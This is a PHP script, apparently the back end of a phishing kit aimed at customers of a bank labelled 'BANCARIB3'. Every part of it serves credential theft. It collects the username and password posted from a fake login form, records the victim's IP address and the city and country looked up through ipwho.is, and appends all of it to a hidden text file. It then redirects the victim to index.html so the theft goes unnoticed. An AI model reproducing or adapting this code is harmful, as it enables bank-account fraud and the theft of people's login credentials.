<?php
// Función para obtener la IP del usuario
function getUserIP() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Función para obtener detalles de la ubicación con ipwhois.app
function getGeoLocation($ip) {
    $url = "https://ipwho.is/$ip";
    $response = file_get_contents($url);

    if ($response === false) {
        return [
            'country' => 'Desconocido',
            'city' => 'Desconocida'
        ];
    }

    $data = json_decode($response, true);
    
    if (!$data['success']) {
        return [
            'country' => 'Desconocido',
            'city' => 'Desconocida'
        ];
    }

    return [
        'country' => $data['country'] ?? 'Desconocido',
        'city' => $data['city'] ?? 'Desconocida'
    ];
}

// Verifica si los datos han sido enviados
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Sanitización de los datos recibidos
    $userid = htmlspecialchars($_POST['userid'] ?? '');
    $password = htmlspecialchars($_POST['password'] ?? '');

    // Obtener la IP y detalles de geolocalización
    $ip = getUserIP();
    $geoInfo = getGeoLocation($ip);

    // Datos de geolocalización
    $pais = $geoInfo['country'] ?? 'Desconocido';
    $ciudad = $geoInfo['city'] ?? 'Desconocida';

    // Construir el mensaje a guardar
    $mensaje = "🏧BANCARIB3🏧:\n";
    $mensaje .= "Usr:  $userid\n";
    $mensaje .= "Cotr:  $password\n";
    $mensaje .= "🏧 IP: $ip\n";
    $mensaje .= "📍 P: $pais\n";
    $mensaje .= "🏙 Ciu: $ciudad\n";
    $mensaje .= "--------------------------\n";

    // Guardar los datos en un archivo de texto
    file_put_contents("Cabimitas00.txt", $mensaje, FILE_APPEND);

    // Redireccionar al usuario
    header("Location: index.html");
    exit;
} else {
    echo "No se enviaron datos.";
}
?>
